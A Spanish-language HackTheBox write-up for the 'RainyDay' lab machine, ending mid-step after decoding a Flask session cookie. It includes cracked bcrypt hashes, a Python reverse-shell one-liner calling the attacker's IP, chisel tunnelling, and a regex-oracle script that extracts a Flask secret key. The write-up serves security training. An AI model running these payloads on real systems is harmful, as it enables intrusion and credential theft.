---
title: "HTB: Resolución de RainyDay"
date: 2023-02-18 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [docker,cookies,sudoers, port forwarding, bcrypt,python]     ## TAG names should always be lowercase
image: rainyday.jpg
img_path: /photos/2023-02-18-RainyDay-WriteUp/
---

***RainyDay*** es una máquina ***Linux*** con dos servicios expuestos: *SSH* y *HTTP*. En primer lugar, conseguiremos autenticarnos en la página web ***crackeando el hash bcrypt*** de un usuario llamado *gary*, encontrado en el *endpoint* de una **API**. Autenticados, podremos desplegar un contenedor de *Docker* y llevar a cabo un **reconocimiento interno de la red**. Mediante *port forwarding* tendremos acceso a un **subdominio** que expone un *endpoint* a través del cual, mediante ***regex***, podremos listar y obtener el **contenido de archivos internos** de la máquina. Así, obtendremos el **secreto de las *cookies*** y forjaremos una para autenticarnos como el usuario *jack* a la web. Ganaremos **acceso al sistema** gracias a un **contenedor que este usuario está *hosteando***. Posteriormente, **pivotaremos** al usuario *jack_adm* aprovechándonos de un **privilegio** asignado a nivel de *sudoers*. **Romperemos las restricciones de la función *exec* de *Python***. Finalmente, para conseguir **máximos privilegios**, conseguiremos **romper** el *hash* *bcrypt* de la contraseña de *root*, **forjando el *pepper***, mediante un binario que *jack_adm* puede ejecutar como *root*.

## Clasificación de dificultad de la máquina

![imagen 1](stats.png)


## Reconocimiento

### ping

Mandamos un _ping_ a la máquina víctima, con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
$> ping -c 1 10.10.11.184
PING 10.10.11.184 (10.10.11.184) 56(84) bytes of data.
64 bytes from 10.10.11.184: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.11.184 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.622/136.622/136.622/0.000 ms
```

Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port discovery

Procedemos a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo hacemos con la herramienta ***nmap***.

```bash
$> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.11.184 -oG allPorts

Nmap scan report for 10.10.11.184
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.  
**--open** filtra por aquellos puertos que tenga un *status open*.

Hemos encontrado **dos puertos abiertos**, el **22** y el **80**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración, en busca de los servicios que están corriendo y de sus versiones.

```bash
$> nmap -sCV -p22,80 10.10.11.184 -oN targeted

Nmap scan report for 10.10.11.184
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:dd:e3:61:dc:5d:58:78:f8:81:dd:61:72:fe:65:81 (ECDSA)
|_  256 ad:bf:0b:c8:52:0f:49:a9:a0:ac:68:2a:25:25:cd:6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, al no disponer de credenciales para autenticarnos por _SSH_, nos centraremos en auditar el puerto **80**.

### Puerto 80 abierto (HTTP)

Gracias a los _scripts_ de reconocimiento que lanza _nmap_, nos damos cuenta de que el servicio web que corre en el puerto **80** nos redirige al dominio ***rainycloud.htb***. Para que nuestra máquina pueda resolver a este dominio deberemos añadirlo al final de nuestro _/etc/hosts_, de la siguiente forma:  `10.10.11.180 rainycloud.htb`.

#### Tecnologías utilizadas

En primer lugar, utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

![imagen 1](Pasted image 20230215001548.png)

La IP nos redirecciona a *raynycloud.htb*, como ya sabíamos. La web está usando como servidor web *nginx 1.18.0*.

#### Inspeccionando la web

Al acceder a http://rainycloud.htb vemos lo siguiente:

![imagen 2](Pasted image 20230215001828.png)

Se trata de un servicio de *hosting* que permite desplegar **contenedores** de *Docker*. Podemos ver que hay un *Docker* desplegado por el usuario *Jack* llamado *secrets*. A la derecha, tenemos las imágenes que podemos utilizar a la hora de desplegar un contenedor. En la parte superior derecha tenemos un botón de *login*:

![imagen 3](Pasted image 20230215002142.png)

La página nos responderá con el error *Error - Registration is currently closed!* si intentamos registrar una nueva cuenta:

![imagen 4](Pasted image 20230215002251.png)

Para acceder a *My Containers* necesitaremos estar autenticados. En este punto, vamos a enumerar **subdominios** y **directorios** que se encuentren bajo el dominio *rainycloud.htb*.

#### Fuzzing de subdominios

Un subdominio es una sección del dominio principal, que se utiliza para organizar y diferenciar diferentes secciones de un sitio web. Por ejemplo, en *rainycloud.htb*, un subdominio puede ser *blog.rainycloud.htb* o *tienda.rainycloud.htb*.

Emplearemos la herramienta *gobuster* para enumerar subdominios. 

```bash
gobuster vhost -u http://rainycloud.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://rainycloud.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/12 12:26:45 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.rainycloud.htb (Status: 403) [Size: 26]
```

**vhost** para aplicar *fuzzing* de subdominios.  
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ subdominios siempre suelo emplear el mismo,  *subdomains-top1million-110000.txt*. Se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-t 200** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido, pero menos fiable.  

Encontramos el subdominio ***dev.rainycloud.htb***. Lo incluiremos en nuestro archivo */etc/hosts* de la siguiente manera: `10.10.11.184 rainycloud.htb dev.rainycloud.htb`. Echaremos un vistazo a la web.


#### Inspeccionando dev.rainycloud.htb

La página web tiene el siguiente aspecto:

![imagen 5](Pasted image 20230215003806.png)

Parece que desde nuestra IP no podemos acceder al sitio web. Podríamos intentar burlar la restricción utilizando cabeceras como *X-Forwarded-For*, pero no obtendremos el resultado esperado. De momento, **dejaremos apartado este subdominio** y continuaremos con el reconocimiento del dominio principal.

#### Fuzzing de directorios

Vamos a **buscar directorios** que se encuentren bajo la URL `http://rainycloud.htb/`. Lo haremos con la herramienta *gobuster*:

```bash
gobuster dir -u http://rainycloud.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rainycloud.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/12 12:26:01 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 3686]
/new                  (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 3254]            
/api                  (Status: 308) [Size: 239] [--> http://rainycloud.htb/api/]
/logout               (Status: 302) [Size: 189] [--> /]                                                         
===============================================================
2023/02/12 12:26:10 Finished
===============================================================
```

**dir** para indicar que queremos aplicar *fuzzing* de directorios.  
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ directorios siempre suelo emplear _directory-list-2.3-medium.txt_. Este diccionario se puede encontrar en el propio _Parrot OS_ o en _Kali_. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-t 200** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido, pero menos fiable.  

Nos encuentra diversos directorios. *register* y *login* ya los conocemos. *logout* y *new* redireccionan a la web principal y al *login* respetivamente. ***api*** es un **directorio interesante**.

#### Inspeccionando http://rainycloud.htb/api

*http://rainycloud.htb/api* nos muestra varios *endpoints*:

![imagen 6](Pasted image 20230215004330.png)

* */api/list* nos da información sobre los contenedores deplegados:

![imagen 7](Pasted image 20230215004534.png)

Solo hay un contenedor desplegado, que es el que habíamos visto anteriormente en la página principal.

* */api/healthcheck* nos da información sobre el estado de la web, aunque, al parecer, para obtener esta información debemos estar en la red interna.

* */api/user* nos da información sobre los usuarios registrados, aunque solo podremos ver información relativa a nuestro usuario. Necesitaremos proporcionar un *id*.  
Normalmente, cada usuario se identifica con un número diferente. Por el tipo de mensajes de respuesta de la web, descubrimos que existen tres usuarios:

![imagen 8](Pasted image 20230218134836.png)

![imagen 9](Pasted image 20230218134857.png)

![imagen 10](Pasted image 20230218134925.png)

En cambio, un *id* con valor **4** nos devuelve:

![imagen 11](Pasted image 20230218135420.png)

Aunque hayamos descubierto estos identificadores, ***fuzzearemos*** el parámetro *id* para descubrir si se están empleando otros nombres de identificador. 

##### Fuzzing de directorios en http://rainycloud.htb/api/user/

Vamos a **buscar directorios** que se encuentren bajo la URL `http://rainycloud.htb/api/user/`. Lo haremos con la herramienta *wfuzz*. 

[SecLists](https://github.com/danielmiessler/SecLists) ofrece un diccionario para enumerar *endpoints* de **APIs**. Es el [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt).

```bash
wfuzz -c -u http://rainycloud.htb/api/user/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt --hh=3
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://rainycloud.htb/api/user/FUZZ
Total requests: 174

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000007:   200        1 L      1 W        101 Ch      "3.0"                                                                                                                    
000000003:   200        1 L      1 W        101 Ch      "1.0"                                                                                                                    
000000005:   200        1 L      1 W        101 Ch      "2.0"                                                                                                                    
000000002:   200        1 L      7 W        50 Ch       "1"                                                                                                                      
000000006:   200        1 L      7 W        50 Ch       "3"                                                                                                                      
000000004:   200        1 L      7 W        50 Ch       "2"                                                                                                                      

Total time: 0
Processed Requests: 174
Filtered Requests: 168
Requests/sec.: 0
```

**-c** es formato colorizado.  
**–hh=3** para ocultar respuestas que contengan 3 caracteres (En este caso, todos los directorios que no existan devolverán esta cantidad de caracteres).  
**-w** para especificar el diccionario que queremos emplear. Como he comentado anteriormente, utilizaré el diccionario  [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt), perfecto para enumerar **APIs**.  
**-u** para especificar la *url*. La palabra *FUZZ* es un término de *wfuzz* y es donde se va a sustituir cada línea del diccionario.

Aparte de los tres directorios que ya sabíamos, *1, 2* y *3*, encontramos otros tres nuevos: ***1.0, 2.0*** y ***3.0***. Vamos a investigarlos.

##### Inpeccionando /api/user/1.0, /api/user/2.0 y /api/user/3.0

Los **tres directorios** encontrados anteriormente **contienen credenciales de usuarios**. Cada directorio contiene unas credenciales diferentes. Las **contraseñas** se encuentran *hasheadas*:

![imagen 12](Pasted image 20230215010558.png)

![imagen 13](Pasted image 20230215010619.png)

![imagen 14](Pasted image 20230215010633.png)

Listado de *hashes*:

```bash
jack:$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O
root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W
gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG
```

Vamos a intentar **romper** los *hashes* a través de un **ataque por diccionario**.

##### Rompiendo hashes bcrypt

Romper un *hash* mediante un **ataque por diccionario** es un tipo de ataque criptográfico, que consiste en adivinar la contraseña original que se utilizó para crear un *hash*, a partir de una lista predefinida de palabras o combinaciones de palabras, conocida como **diccionario**.

El primer paso, será saber ante qué tipo de *hash* nos estamos enfrentando. En [esta](https://www.tunnelsup.com/hash-analyzer/) página web podemos analizar el tipo de *hash*. Comprobamos que se está utilizando ***bcrypt***:

![imagen 15](Pasted image 20230215011458.png)

***Bcrypt*** es una función de *hashing* criptográfica, utilizada comúnmente para almacenar contraseñas de forma segura. Se utiliza para proteger las contraseñas de los usuarios mediante el proceso de *hashing*, que convierte una contraseña en una cadena de caracteres aleatoria e irreconocible.

Los *hashes* *Bcrypt* suelen tardar bastante tiempo en romperse, por lo que para romperlos utilizaré *Hashcat* en mi equipo *Windows* local y poder así aprovechar la tarjeta gráfica.

El diccionario que emplearé será el [rockyou-70.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-70.txt), que también se encuentra en [SecLists](https://github.com/danielmiessler/SecLists). Para ordenadores menos potentes, recomiendo el [rockyou-50.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-50.txt). Los dos son versiones reducidas del famoso diccionario [rockyou.txt.](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz).

El **comando** que utilizaré es el siguiente:

```powershell
PS C:\Users\franc\Documents\hashcat-6.2.6> .\hashcat.exe -a 0 -w 3 -m 3200 --username .\hashes .\rockyou-70.txt
```

* *-a 0* indica el tipo de ataque que se va a realizar. En este caso, `0` representa el modo de ataque de diccionario, lo que significa que *Hashcat* probará cada una de las palabras en el diccionario especificado para ver si alguna de ellas es la contraseña correcta.
-  *-w 3* establece el nivel de *verbose* que se mostrará durante la ejecución de *Hashcat*. El valor `3` indica que se mostrarán mensajes de advertencia, pero no mensajes de depuración ni de información.
- *-m 3200* especifica el tipo de *hash* que se está intentando *crackear*. En este caso, `3200` representa el tipo de *hash* *bcrypt \$2\*\$*.
- *--username* indica que se espera que el archivo de *hashes* contenga nombres de usuario. 
- *hashes* contiene los tres *hashes* de los usuarios, de la forma *usuario:hash*.
- *rockyou-70.txt* es el diccionario que se emplearé para romper los *hashes*.

Pasado un tiempo, obtenemos el siguiente **resultado**:

![imagen 16](Pasted image 20230214122001.png)

Para el usuario ***gary***, descubrimos que su contraseña es ***rubberducky***.

#### Iniciando sesión en la página web

Podemos utilizar las credenciales anteriores, `gary:rubberducky`, para autenticarnos en el portal web. Una vez dentro, tendremos acceso a la sección *My Containers*:

![imagen 17](Pasted image 20230215215849.png)

Vamos a desplegar un contenedor. Como ya sabíamos, podemos elegir entre dos imágenes, *alpine* y *alpine-python*. La principal diferencia entre ambas es que *alpine* es una imagen mínima de *Linux* que contiene solo las herramientas necesarias para ejecutar una aplicación en un contenedor, mientras que *alpine-python* es una imagen que incluye una versión específica de *Python* instalada en la imagen *alpine*. De momento, podemos elegir cualquiera. Finalmente, elegimos un nombre para el contenedor y lo creamos. Nos debería aparecer el contenedor en *My Containers*:

![imagen 18](Pasted image 20230215220305.png)

El sistema ofrece varias opciones, como la de ejecutar un comando en el contenedor. Por ejemplo, un `ls -la` se vería de la siguiente forma:

![imagen 19](Pasted image 20230215220513.png)

![imagen 20](Pasted image 20230215220533.png)

Vamos a enviarnos una *reverse shell* y a enumerar la red desde dentro.

## Consiguiendo shell como jack

### Ganando acceso completo a un contenedor

Nos enviaremos una *reverse shell* para ganar acceso completo al contenedor. Para ello, recomiendo utilizar la imagen *alpine-python*, ya que tiene instalado *Python*, que nos permite enviar la *shell* utilizando este lenguaje. Por lo tanto, desplegaré un nuevo contenedor con la imagen *alpine-python*:

![imagen 21](Pasted image 20230215221041.png)

Y ejecutaré el siguiente comando (extraído de [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)):

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.65",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Los valores `s.connect(("10.10.14.65",443))` **deben ser cambiados** dependiendo de nuestra IP y del puerto en el que queramos recibir la *shell*. 

Previamente a ejecutar el comando, nos ponemos en escucha con *netcat* mediante el comando `sudo nc -nlvp 443`. Deberíamos recibir una consola:

![imagen 22](Pasted image 20230215221329.png)

Le haremos un tratamiento a la consola para hacerla más interactiva. Esto significa poder hacer *Ctrl+C* sin perder la *shell*, limpiar los comandos, movernos con las flechas… Escribiremos la siguiente secuencia de comandos:

```bash
python3 -c 'import pty;pty.spawn("/bin/sh")'
*CTRL+Z*
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![imagen 23](Pasted image 20230215221556.png)

### Reconocimiento desde la red interna

La IP que tiene asignada el contenedor es la *172.18.0.4* (esta IP puede variar dependiendo de los contenedores que haya desplegados):

![imagen 24](Pasted image 20230215221620.png)

La IP *172.18.0.1* debería pertenecer a la **máquina víctima**, por la forma en la que *Docker* asigna las IP a los *hosts*. Esto quiere decir que el *host* que estamos atacando tendrá una interfaz con la IP *10.10.11.184* y otra interfaz, normalmente llamada *docker0*, con la IP *172.18.0.1*.


Recordemos que podemos obtener **resultados diferentes** escaneando un host desde la red interna a hacerlo desde el exterior. Otro punto importante es el no tener acceso a *dev.rainycloud.htb* desde el exterior (El servidor respondía con ***Access Denied - Invalid IP***). Vamos a utilizar *chisel* y *proxychains* para escanear los puertos de la *10.10.11.185* desde nuestra máquina de atacante, pero pasando por el contenedor para hacerlo desde la red interna. Posteriormente, investigaremos el **subdominio** *dev.rainycloud.htb*, también desde la red interna.

#### 172.18.0.1 Internal Port Discovery

> Paso optativo. No encontraremos abierto ningún puerto interesante.
{: .prompt-info }

Emplearemos [chisel](https://github.com/jpillora/chisel) para tener conexión desde nuestro equipo de atacante a la **172.18.0.1** y poder así analizar sus puertos abiertos.

En mi máquina descargaré el *chisel* de 64 bits y lo ejecutaré de la siguiente manera:

![imagen 25](Pasted image 20230216000517.png)

En la máquina víctima, ejecutaremos el *chisel* de 64 bits de la siguiente forma (previamente lo deberemos transferir a la máquina desplegando, por ejemplo, un servidor *python*):

```bash
/tmp $ ./chisel client 10.10.14.65:1234 R:socks
```

El resultado debería ser el siguiente:

![imagen 26](Pasted image 20230216000853.png)

Estamos estableciendo un tipo de conexión **_SOCKS_**. Esto nos permitirá tener acceso completo a la ip **172.18.0.1** a través del puerto **1080** de nuestro **_localhost_**.

Por último nos faltará configurar la herramienta **_proxychains_** para escanear sus puertos pasando por el *localhost:1080*. El archivo de configuración de la herramienta lo podemos encontrar en la ruta **_/etc/proxychains.conf_**. En caso de no tenerlo se tendrá que instalar la herramienta. Deberemos introducir al final del archivo la siguiente línea: `socks5 127.0.0.1 1080`.

Utilizaremos _nmap_ para descubrir los puertos abiertos de la ip **172.18.0.1**. En mi caso escanearé los **200 más comunes**. El comando que ejecutaremos será:

```bash
$> proxychains4 -q nmap -sT -n -Pn --top-ports 200 -v 172.18.0.1

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-14 12:51 CET
Initiating Connect Scan at 12:51
Scanning 172.18.0.1 [200 ports]
Discovered open port 22/tcp on 172.18.0.1
Discovered open port 80/tcp on 172.18.0.1
Discovered open port 49153/tcp on 172.18.0.1
Discovered open port 49154/tcp on 172.18.0.1
Completed Connect Scan at 12:52, 56.67s elapsed (200 total ports)
Nmap scan report for 172.18.0.1
Host is up (0.28s latency).
Not shown: 196 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
49153/tcp open  unknown
49154/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 56.72 seconds
```

Aparte del *22* y el *80* que ya los conocíamos, vemos abiertos dos nuevos puertos: el *49153* y el *49154*. Lamentablemente, estos puertos **no exponen ningún servicio interesante**.

#### Port forwarding. Investigando dev.rainyday.htb.

Recordemos que **no** teníamos **acceso al subdominio desde el exterior** (utilizando la IP 10.10.11.184). Emplearemos [chisel](https://github.com/jpillora/chisel) para hacer *port forwarding* y tener conexión desde nuestro equipo de atacante a la **172.18.0.1:80**.

En mi máquina descargaré el *chisel* de 64 bits y lo ejecutaré de la siguiente manera:

![imagen 27](Pasted image 20230216000517.png)

En la máquina víctima, ejecutaremos el *chisel* con el siguiente comando:

```bash
/tmp $ ./chisel client 10.10.14.65:1234 R:8081:172.18.0.1:80
```

Haremos que nuestro *localhost* por el puerto **8081** exponga el servicio que está corriendo en la ip **172.18.0.1** por el puerto **80**. Finalmente, para que *http://rainyday.htb* y *http://dev.rainyday.htb* apunten a la *172.18.0.1:80*, deberemos modificar el */etc/hosts*:

![imagen 28](Pasted image 20230216003749.png)

Hemos modificado la línea `10.10.11.185 rainycloud.htb dev.rainycloud.htb` por `127.0.0.1 rainycloud.htb dev.rainycloud.htb`

Ahora ya **tendremos acceso al subdominio**, a través de la URL *http://dev.rainycloud.htb:8081*:

![imagen 29](Pasted image 20230216003948.png)

**Resumiendo acceso al subdominio**:

* Desde el exterior (IP *10.10.11.184*), *http://dev.rainyday.htb* es inaccesible.
* Desde el interior (IP *172.18.0.1*), h*ttp://dev.rainyday.htb* es accesible.
* Para tener acceso al puerto *80* de la IP *172.18.0.1* emplearemos *port forwarding*, para que nuestra IP *127.0.0.1:8081* apunte a la *172.18.0.1:80*.
* Modificamos */etc/hosts* para que, tanto *http://dev.rainyday.htb* como *http://rainyday.htb*, apunten a nuestra IP *127.0.0.1*, que a su vez apuntará a la *172.18.0.1*.

Parece la misma página web que *http://rainycloud.htb*. Ahora bien, recordemos que existía un *endpoint* de la **API**, llamado *healthcheck*, a través del cual podíamos obtener información de la página web en el supuesto de encontrarnos en la red interna:

![imagen 30](Pasted image 20230216005536.png)

Desde *http://dev.rainycloud.htb:8081*, sí que podremos acceder a su contenido:

![imagen 31](Pasted image 20230216151029.png)

Si interceptamos la petición con *BurpSuite*:

![imagen 32](Pasted image 20230216150807.png)

La página nos responde con un *JSON*. Cada objeto de *results* contiene:

* *file*: ruta absoluta de un archivo.
* *type*: tipo de archivo.
* *pattern*: especificación de un patrón (únicamente presente en el último valor de *results*).

Es posible que para obtener información de un archivo en concreto, tengamos que tramitar una petición por POST, para especificar los atributos del archivo. Entonces, con *Bupsuite*, interceptaremos la petición por GET a http://dev.rainycloud.htb:8081/api/healthcheck y la enviaremos al *Repeater*. Haremos clic derecho *Chage request method* para cambiar la petición a POST. Los parámetros que espera la web serán el archivo (*file*) y el tipo (*type*) (también esperará *pattern* si se ha especificado un patrón). Por ejemplo, el resultado para */var/www/rainycloud/app.py* es el siguiente:

![imagen 33](Pasted image 20230216152047.png)

El servidor nos responderá con:

![imagen 34](Pasted image 20230216152157.png)

A priori no vemos nada interesante. Haremos una prueba. Vamos a tramitar una petición por POST que contenga un archivo que no exista, por ejemplo */var/www/rainycloud/app.p*:

![imagen 35](Pasted image 20230216153032.png)

El servidor responde con un *500 Internal Server Error*, ya que el archivo no existe. Si ahora tramitamos una petición con un archivo que existe en la máquina víctima, como el */etc/hosts* obtenemos el siguiente resultado:

![imagen 36](Pasted image 20230216153056.png)

Es decir, **la respuesta del servidor varía dependiendo de si el archivo existe en la máquina o no**. Por lo tanto, nos podemos aprovechar del error para **enumerar archivos existentes en la máquina**.

Otro punto interesante del funcionamiento de *healthcheck* es la **utilización de patrones**. Para el archivo */etc/passwd* se está utilizando el patrón *^root.\**.  Esta patrón significa que el archivo empieze por *root* seguido de cualquier secuencia de caracteres. Vamos a tramitar una petición por POST especificando los atributos de este archivo:

![imagen 37](Pasted image 20230216155900.png)

Nos devuelve un *true*. Esto ocurre porque el */etc/passwd* empieza por *root* seguido de cualquier secuencia de caracteres. Por ejemplo, si en vez de *^root.\** escribimos *^test.\**:

![imagen 38](Pasted image 20230216160046.png)

Como */etc/passwd* no empieza por *test*, el servidor nos responde con un *false*. Esta implementación hace que mediante *regex* podamos obtener el **contenido de archivos internos de la máquina víctima**. 

**Resumiendo:

* Podemos enumerar archivos internos de la máquina.
* Podemos obtener el contenido de archivos internos de la máquina víctima.

#### Obteniendo secreto de las cookies

Una ruta interesante para enumerar archivos es la que nos mostraba el *endpoint* *healthcheck*, */var/www/rainycloud*. En este directorio se encuentran todos los ficheros relativos a la página web.  

Utilizaré la herramienta *wfuzz* para descubrir ficheros que se encuentren en */var/www/rainycloud* y que acaben con la extensión *py*

```bash
$> wfuzz -c -u http://dev.rainycloud.htb:8081/api/healthcheck -H 'Cookie: session=eyJ1c2VybmFtZSI6ImphY2sifQ.Y-uccQ.vPW4KvW-f-JyUPq1ABDcK8h-SYw' -d 'file=/var/www/rainycloud/FUZZ.py&type=PYTHON' -t 50 --hc=500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.rainycloud.htb:8081/api/healthcheck
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000895:   200        1 L      1 W        94 Ch       "app"                                                                                                                     
000007909:   200        1 L      1 W        99 Ch       "secrets"       
```

**-c** es formato colorizado.  
**–hc=500** para ocultar respuestas que contengan un código 500 (recordemos que este código se devolvía cuando no existía un archivo).  
**-w** para especificar el diccionario que queremos emplear. Utilizaremos el *directory-list-2.3-medium.txt*. Este diccionario se puede encontrar en el propio *Parrot OS* o en *Kali*. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-u** para especificar la *url*. 
*-H* para especificar la cookie (para tramitar la petición necesitaremos estar autenticados como *gary*).
*-d* para especificar los datos que se tramitarán por POST.  **FUZZ** es una palabra clave de *wfuzz* y es donde se sustituirá cada línea del diccionario.
*-t 50* para especificar la cantidad de hilos. A mas hilos mas rápido, pero menos fiable.

Descubrimos un archivo interesante: */var/www/rainycloud/secrets.py*

Ahora, a través de la cláusula *^* de *regex*, obtendremos el contenido de *secrets.py*. Crearemos un *script* en *python* que iniciará un bucle que se ejecutará x veces y, en cada iteración, iterará sobre una lista de caracteres para recomponer el archivo. El *script* es el siguiente:

```python
#!/usr/bin/python3

import sys, signal
from pwn import *
import string
import requests

## Variables globales
letters = string.ascii_uppercase + " _\"':=!()){}[]" + string.digits + string.ascii_lowercase

burp = {"http": "http://127.0.0.1:8080"}


## Ctrl+C
def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":

	p1 = log.progress("Local file inclusion via regex")

	p2 = log.progress("SECRET_KEY: ")

	url = "http://dev.rainycloud.htb:8081/api/healthcheck"

	headers = {
		"Cookie": "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-t9zQ.QD3-7e8GkvU84-RV4Y8ehaSVIy0",
	}

	secret_key = ""

	for pos in range(1, 500):
		for letter in letters:

			if not "*" in letter and not "?" in letter and not "+" in letter and not "." in letter:
	
				post_data = {
					"file": "/var/www/rainycloud/secrets.py",
					"pattern": f"^{secret_key}{letter}",
					"type": "CUSTOM",
				}

				p1.status(post_data["pattern"])
				r = requests.post(url, headers=headers, data=post_data, proxies=burp)

				if "true" in r.text:
					secret_key += letter
					p2.status(secret_key)
					break
```

Ejemplo de funcionamiento:

* *secret_key* contendrá el archivo. Al principio está vacio.
* En la primera iteración se enviará como patrón *^a*. 
* Si la respuesta del servidor es *true*, querrá decir que *secrets.py* empieza por *a* y por tanto se guardará este valor en *secret_key*. Posteriormente, con *break* saldremos del bucle interior y en la siguiente interación se enviará el patrón *^aa*. Si *secrets.py* no empieza por *aa*, el resultado no será *true* y en la siguiente iteración se enviará *^ab*. Si *secrets.py* empieza por *ab* el resultado será *true* y se guardará el valor en *secret_key*. Así sucesivamente hasta obtener el contenido del archivo.

Se trata de un proceso lento. Si por ejemplo, quisiéramos listar todo el */etc/passwd*, tardaríamos demasiado tiempo. 

Ejecutamos el *script* y, pasado un tiempo, deberíamos obtener la siguiente cadena:

![imagen 39](Pasted image 20230214151511.png)

`SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'`

Parece que se trata del **secreto** de una *cookie*. 

### Forjando la cookie de jack

El **secreto de una cookie** (también conocido como *cookie secret* en inglés) es una cadena de caracteres aleatoria y secreta que se utiliza para firmar las *cookies* en una aplicación web. Disponiendo del **secreto**, podemos forjar una *cookie* con los datos que queramos.

Recapitulando un poco, recordemos que *jack* estaba corriendo un contenedor llamado *secrets*. Nos interesa ganar acceso como *jack*, ya que este contenedor puede contener **información interesante**.

Vamos a inspeccionar la *cookie* de *gary*. La herramienta que utilizaré será *flask-unsign*:

```bash
flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-5Pww.MCPcJ4zOX2RtJHvQGAhkAl2t9hk"
{'username': 'gary'}
